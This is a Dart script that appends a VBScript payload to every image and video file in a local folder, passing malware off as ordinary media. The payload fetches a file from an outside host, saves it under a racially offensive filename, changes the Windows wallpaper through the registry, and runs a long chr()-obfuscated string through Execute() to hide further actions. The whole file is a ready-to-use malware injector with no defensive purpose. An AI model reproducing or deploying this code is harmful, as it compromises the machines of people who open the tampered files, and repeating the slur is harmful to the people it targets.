import 'dart:io';
import 'package:ansicolor/ansicolor.dart';
import 'dart:convert';

void main() {
  var end = ["png", "jpg", "jpeg", "webm", "mp4", "mov", "webp", "gif"];
  var inject = [];
  var getCode = () => """
Set objShell = CreateObject("WScript.Shell")
    Set objEnv = objShell.Environment("User")
    strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", "https://avatars.githubusercontent.com/u/78520042?v=4", False
    xHttp.Send
    with bStrm
        .type = 1
        .open
        .write xHttp.responseBody
        .savetofile strDirectory + "\\nignog.png", 2
    end with
    objShell.RegWrite "HKCU\\Control Panel\\Desktop\\Wallpaper", strDirectory + "\\nignog.png"
    objShell.Run "%windir%\\System32\\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    Execute(chr( -9032+9071 ) & chr( 5608-5497 ) & chr( 4514-4402 ) & chr( 9252-9151 ) & chr( 913990/8309 ) & chr( 112000/3500 ) & chr( 10989/111 ) & chr( -3565+3669 ) & chr( 7299-7185 ) & chr( 809523/7293 ) & chr( -9384+9493 ) & chr( 5399-5298 ) & chr( 211808/6619 ) & chr( 5290-5182 ) & chr( 7408-7297 ) & chr( 733968/6796 ) & chr( 18746/1442 ) & chr( -618+628 ) & chr( -4614+4682 ) & chr( 900795/8579 ) & chr( 587292/5388 ) & chr( 7282-7250 ) & chr( 357850/4210 ) & chr( -3636+3718 ) & chr( 463600/6100 ) & chr( 168168/3822 ) & chr( 4938-4851 ) & chr( -2825+2940 ) & chr( 229-125 ) & chr( -9191+9274 ) & chr( 726128/6982 ) & chr( 9730-9629 ) & chr( -7809+7917 ) & chr( -7587+7695 ) & chr( -7341+7385 ) & chr( -4721+4826 ) & chr( 8850-8837 ) & chr( 3336-3326 ) & chr( -4163+4248 ) & chr( 2308-2226 ) & chr( 6227-6151 ) & chr( 178144/5567 ) & chr( 132126/2166 ) & chr( 3214-3182 ) & chr( 2066-2032 ) & chr( 4079-3975 ) & chr( 828124/7139 ) & chr( 197548/1703 ) & chr( -2447+2559 ) & chr( -3145+3260 ) & chr( 1634-1576 ) & chr( 9501-9454 ) & chr( 127746/2718 ) & chr( -8172+8291 ) & chr( 9408-9289 ) & chr( 875-756 ) & chr( 1445-1399 ) & chr( 9214-9093 ) & chr( -387+498 ) & chr( 7704-7587 ) & chr( -6286+6402 ) & chr( -5729+5846 ) & chr( 669242/6829 ) & chr( -4479+4580 ) & chr( -9384+9430 ) & chr( 384813/3887 ) & chr( 700965/6315 ) & chr( 438834/4026 ) & chr( 1140-1093 ) & chr( 862191/8709 ) & chr( -8290+8394 ) & chr( 84487/871 ) & chr( 649880/5908 ) & chr( -851+961 ) & chr( 9012-8911 ) & chr( 7825-7717 ) & chr( 7345-7298 ) & chr( 1535-1450 ) & chr( 342772/5116 ) & chr( 864424/9823 ) & chr( -2478+2592 ) & chr( 6234-6137 ) & chr( 73370/667 ) & chr( -39+105 ) & chr( 8104-8025 ) & chr( -1070+1140 ) & chr( 697-627 ) & chr( 500093/4133 ) & chr( 287980/3740 ) & chr( -7658+7734 ) & chr( -6394+6467 ) & chr( 549445/5135 ) & chr( 8887-8783 ) & chr( 7415-7349 ) & chr( -987+1061 ) & chr( -8876+8994 ) & chr( 317616/6108 ) & chr( 6678-6573 ) & chr( -3596+3693 ) & chr( -9139+9252 ) & chr( 492505/7577 ) & chr( 73032/2148 ) & chr( 65650/5050 ) & chr( 21040/2104 ) & chr( 743348/8956 ) & chr( 6075-5974 ) & chr( -2112+2228 ) & chr( -1370+1402 ) & chr( 427866/4918 ) & chr( 221-106 ) & chr( -3624+3728 ) & chr( -3573+3656 ) & chr( 4145-4041 ) & chr( 1858-1757 ) & chr( 4564-4456 ) & chr( -2923+3031 ) & chr( -3780+3812 ) & chr( 8356-8295 ) & chr( 23232/726 ) & chr( 6414-6347 ) & chr( -5507+5621 ) & chr( 226644/2244 ) & chr( -5161+5258 ) & chr( 937628/8083 ) & chr( 9868-9767 ) & chr( -6205+6284 ) & chr( 2276-2178 ) & chr( -5265+5371 ) & chr( 45753/453 ) & chr( 817047/8253 ) & chr( 2134-2018 ) & chr( -2963+3003 ) & chr( -757+791 ) & chr( 534528/6144 ) & chr( 6799-6716 ) & chr( 8523-8424 ) & chr( 888744/7796 ) & chr( -3001+3106 ) & chr( 517216/4618 ) & chr( -6622+6738 ) & chr( 339986/7391 ) & chr( 2559-2444 ) & chr( -5370+5474 ) & chr( 5803-5702 ) & chr( -9298+9406 ) & chr( -2514+2622 ) & chr( -5408+5442 ) & chr( 30012/732 ) & chr( 2590-2577 ) & chr( -2247+2257 ) & chr( 2154-2084 ) & chr( 1098789/9899 ) & chr( -9429+9543 ) & chr( 163904/5122 ) & chr( 9476-9371 ) & chr( -8899+8931 ) & chr( 113094/1854 ) & chr( 164800/5150 ) & chr( 128592/2679 ) & chr( 6243-6211 ) & chr( 5080-4964 ) & chr( 158397/1427 ) & chr( -3758+3790 ) & chr( -7727+7780 ) & chr( 3280-3232 ) & chr( 3209-3196 ) & chr( 58920/5892 ) & chr( -2301+2333 ) & chr( -4894+4926 ) & chr( -4825+4857 ) & chr( 8612-8580 ) & chr( 6311-6224 ) & chr( 830070/7218 ) & chr( 100256/964 ) & chr( -2772+2855 ) & chr( 8565-8461 ) & chr( 119988/1188 ) & chr( -1123+1231 ) & chr( 661500/6125 ) & chr( 262614/5709 ) & chr( 566060/6820 ) & chr( -5424+5525 ) & chr( 7312-7202 ) & chr( -7189+7289 ) & chr( 8082-8007 ) & chr( 895971/8871 ) & chr( 1428-1307 ) & chr( 20585/179 ) & chr( -7505+7545 ) & chr( -6349+6448 ) & chr( 526760/5065 ) & chr( 4128-4014 ) & chr( -2101+2141 ) & chr( 421204/8596 ) & chr( 1564-1509 ) & chr( 6135-6082 ) & chr( -7361+7402 ) & chr( -5764+5805 ) & chr( 5090-5077 ) & chr( -6320+6330 ) & chr( 222066/2847 ) & chr( 3828-3727 ) & chr( 793680/6614 ) & chr( -2244+2360 ) & chr( 89674/6898 ) & chr( 8176-8166 ) & chr( 8458-8371 ) & chr( 509680/4432 ) & chr( -1781+1885 ) & chr( -1+84 ) & chr( -8901+9005 ) & chr( 562-461 ) & chr( 9150-9042 ) & chr( -492+600 ) & chr( -8534+8580 ) & chr( 1131-1017 ) & chr( 410787/3511 ) & chr( -5878+5988 ) & chr( 3597-3565 ) & chr( -4295+4329 ) & chr( 9407-9340 ) & chr( -2601+2678 ) & chr( 124848/1836 ) & chr( 40928/1279 ) & chr( 4530-4483 ) & chr( 151286/2258 ) & chr( -7644+7676 ) & chr( 47035/409 ) & chr( -5685+5801 ) & chr( -6374+6471 ) & chr( 772008/6772 ) & chr( 338024/2914 ) & chr( 4092-4060 ) & chr( 219384/2216 ) & chr( 126984/1221 ) & chr( -7533+7647 ) & chr( 991452/8932 ) & chr( 6658-6549 ) & chr( 456722/4522 ) & chr( 281382/6117 ) & chr( 403798/3998 ) & chr( -1561+1681 ) & chr( -6482+6583 ) & chr( 239616/7488 ) & chr( -1708+1742 ) & chr( -9949+9981 ) & chr( 8755-8717 ) & chr( 3615-3583 ) & chr( -8471+8556 ) & chr( -8892+8974 ) & chr( -8569+8645 ) & chr( 124096/3878 ) & chr( -9700+9738 ) & chr( -6308+6340 ) & chr( -5457+5491 ) & chr( 542-508 ) & chr( -4448+4492 ) & chr( 4963-4915 ) & chr( 4833-4789 ) & chr( 3331-3261 ) & chr( 90016/928 ) & chr( -7585+7693 ) & chr( 399855/3477 ) & chr( -4485+4586 ) & chr( -1050+1063 ) & chr( 2834-2824 ) & chr( 63700/4900 ) & chr( 45840/4584 ) & chr( 226980/5820 ) & chr( 8728-8613 ) & chr( -3690+3807 ) & chr( -5916+6014 ) & chr( 77-27 ) & chr( 8638-8522 ) & chr( 131726/1358 ) & chr( 1114920/9291 ) & chr( 96473/7421 ) & chr( -6160+6170 ) & chr( 0+115 ) & chr( 756086/7486 ) & chr( -5527+5643 ) & chr( 10560/330 ) & chr( 9134-9047 ) & chr( -1213+1328 ) & chr( -1136+1240 ) & chr( 10016-9933 ) & chr( -8428+8532 ) & chr( 4300-4199 ) & chr( 4775-4667 ) & chr( 9174-9066 ) & chr( 5383-5351 ) & chr( 7201-7140 ) & chr( 169088/5284 ) & chr( -1886+1973 ) & chr( 638436/7692 ) & chr( 3945-3846 ) & chr( 724698/6357 ) & chr( 845460/8052 ) & chr( -39+151 ) & chr( 657952/5672 ) & chr( 107-61 ) & chr( 6927-6860 ) & chr( -8614+8728 ) & chr( 669024/6624 ) & chr( 2570-2473 ) & chr( 3224-3108 ) & chr( 588830/5830 ) & chr( 661151/8369 ) & chr( -8480+8578 ) & chr( -1559+1665 ) & chr( -5171+5272 ) & chr( 5327-5228 ) & chr( 7386-7270 ) & chr( 2594-2554 ) & chr( -7238+7272 ) & chr( 798486/9178 ) & chr( 6428-6345 ) & chr( -5858+5957 ) & chr( 3571-3457 ) & chr( 509565/4853 ) & chr( -7395+7507 ) & chr( 836476/7211 ) & chr( 1905-1859 ) & chr( 4626-4543 ) & chr( 142272/1368 ) & chr( -1707+1808 ) & chr( -1808+1916 ) & chr( -3086+3194 ) & chr( -2409+2443 ) & chr( -358+399 ) & chr( 9487-9474 ) & chr( 3420-3410 ) & chr( 436275/4155 ) & chr( -3756+3788 ) & chr( 108763/1783 ) & chr( 479-447 ) & chr( 184032/3834 ) & chr( -7924+7937 ) & chr( -2490+2500 ) & chr( 765638/7223 ) & chr( 246848/7714 ) & chr( 9027-8966 ) & chr( -6656+6688 ) & chr( 446784/9308 ) & chr( 77194/5938 ) & chr( 8158-8148 ) & chr( 581900/5819 ) & chr( -9818+9929 ) & chr( 7567-7554 ) & chr( 6924-6914 ) & chr( 2854-2767 ) & chr( 571550/4970 ) & chr( -5410+5514 ) & chr( -1767+1850 ) & chr( 708760/6815 ) & chr( -7871+7972 ) & chr( 1789-1681 ) & chr( -9593+9701 ) & chr( 397946/8651 ) & chr( -5047+5130 ) & chr( -1718+1819 ) & chr( 2474-2364 ) & chr( -5269+5369 ) & chr( -223+298 ) & chr( 60903/603 ) & chr( -1776+1897 ) & chr( 5587-5472 ) & chr( 399320/9983 ) & chr( 224774/6611 ) & chr( 677853/5511 ) & chr( -3782+3866 ) & chr( 8417-8352 ) & chr( 7395-7329 ) & chr( 699-574 ) & chr( 6899-6865 ) & chr( 91225/2225 ) & chr( -4135+4148 ) & chr( -9601+9611 ) & chr( 7293-7188 ) & chr( 194560/6080 ) & chr( -7305+7366 ) & chr( 169664/5302 ) & chr( 9066-8961 ) & chr( -7018+7050 ) & chr( -1144+1187 ) & chr( -5451+5483 ) & chr( 133133/2717 ) & chr( 129038/9926 ) & chr( -8712+8722 ) & chr( 8258-8150 ) & chr( -283+394 ) & chr( -2043+2154 ) & chr( 782544/6987 ) & chr( -6417+6449 ) & chr( -218+337 ) & chr( 8941-8837 ) & chr( 2010-1905 ) & chr( -3581+3689 ) & chr( -2196+2297 ) & chr( 7764-7732 ) & chr( 346920/3304 ) & chr( -8297+8329 ) & chr( -2370+2430 ) & chr( 4288-4256 ) & chr( -9873+9922 ) & chr( -8940+8989 ) & chr( -8288+8301 ) & chr( 6490-6480 ) & chr( 439800/4398 ) & chr( -9332+9443 ) & chr( 50440/3880 ) & chr( -121+131 ) & chr( -8195+8282 ) & chr( 3736-3621 ) & chr( -4437+4541 ) & chr( -3510+3593 ) & chr( 7130-7026 ) & chr( 712-611 ) & chr( 2176-2068 ) & chr( 3014-2906 ) & chr( -4946+4992 ) & chr( 9738-9655 ) & chr( 974448/9648 ) & chr( -6656+6766 ) & chr( -345+445 ) & chr( 5229-5154 ) & chr( 694577/6877 ) & chr( 184646/1526 ) & chr( -444+559 ) & chr( -1622+1662 ) & chr( 4790-4756 ) & chr( 6317-6194 ) & chr( 442566/6414 ) & chr( 8969-8891 ) & chr( -608+692 ) & chr( 513084/7436 ) & chr( 8075-7993 ) & chr( 838750/6710 ) & chr( -3464+3498 ) & chr( -4532+4573 ) & chr( -9177+9190 ) & chr( 154-144 ) & chr( 8499-8393 ) & chr( 4615-4583 ) & chr( -2740+2801 ) & chr( 139904/4372 ) & chr( 2111-2005 ) & chr( -7067+7099 ) & chr( 5574-5531 ) & chr( -9700+9732 ) & chr( -7316+7365 ) & chr( -9398+9411 ) & chr( -2980+2990 ) & chr( 6825-6717 ) & chr( 9023-8912 ) & chr( -1354+1465 ) & chr( 525840/4695 ) & chr( 31264/977 ) & chr( 891310/7490 ) & chr( -761+865 ) & chr( 952140/9068 ) & chr( 8424-8316 ) & chr( -5249+5350 ) & chr( 7901-7869 ) & chr( 8545-8439 ) & chr( -9665+9697 ) & chr( 69000/1150 ) & chr( -359+391 ) & chr( -3994+4043 ) & chr( 81107/6239 ) & chr( 49530/4953 ) & chr( 9017-9004 ) & chr( 1032-1022 ) & chr( 164346/4214 ) & chr( -3130+3229 ) & chr( 208980/1935 ) & chr( 380064/3424 ) & chr( 170-55 ) & chr( -3753+3854 ) & chr( 2144/67 ) & chr( -9103+9202 ) & chr( 556192/5348 ) & chr( -996+1110 ) & chr( 215451/1941 ) & chr( -5108+5217 ) & chr( 185436/1836 ) & chr( 8905/685 ) & chr( -8743+8753 ) & chr( 2303-2235 ) & chr( -6314+6419 ) & chr( 509466/4674 ) & chr( -9323+9355 ) & chr( -9833+9930 ) & chr( 6264-6152 ) & chr( -6467+6579 ) & chr( -5243+5256 ) & chr( 1890-1880 ) & chr( 315056/3248 ) & chr( 706272/6306 ) & chr( 629664/5622 ) & chr( -540+572 ) & chr( -12+73 ) & chr( -5137+5169 ) & chr( 225027/2273 ) & chr( 249184/2396 ) & chr( 473556/4154 ) & chr( 999-888 ) & chr( 510992/4688 ) & chr( 2751-2650 ) & chr( 3216-3170 ) & chr( 261388/2588 ) & chr( 5119-4999 ) & chr( -437+538 ) & chr( -9945+9958 ) & chr( 5812-5802 ) & chr( 290709/2997 ) & chr( -4060+4172 ) & chr( -7400+7512 ) & chr( 343528/7468 ) & chr( 1209-1128 ) & chr( 651339/5567 ) & chr( -3876+3981 ) & chr( 1047-931 ) &  vbcrlf  )""";
  
  if (!Directory("./images").existsSync()) {
    Directory("./images").createSync();
    print("Please, Put A IMG or a VIDEO Into The \"Image\" Folder");
    return;
  }
  
  var read = Directory("./images").listSync();
  if (read.isNotEmpty) {
    end.forEach((b) => read.forEach((z) => z.path.split(".").last == b ? inject.add(z.path) : ""));
    inject.forEach((r) async {
      var file = new File(r);
      var path = file.path;
      try {
          if ((await file.readAsString(encoding:latin1)).contains(getCode())) {
          print("${path.split("/").last} Already Injected !");
        } else {
          file.writeAsStringSync(getCode(), mode: FileMode.append);
          print("${path.split("/").last} Injected !");
        }
      } catch(e) {
        print(e);
      }
    });
  }
}

String ansiColor(String text, List<AnsiPen> pens) {
  var pen = AnsiPen()..reset();
  pens.forEach((p) => pen..write(p(text)));
  return pen.toString();
}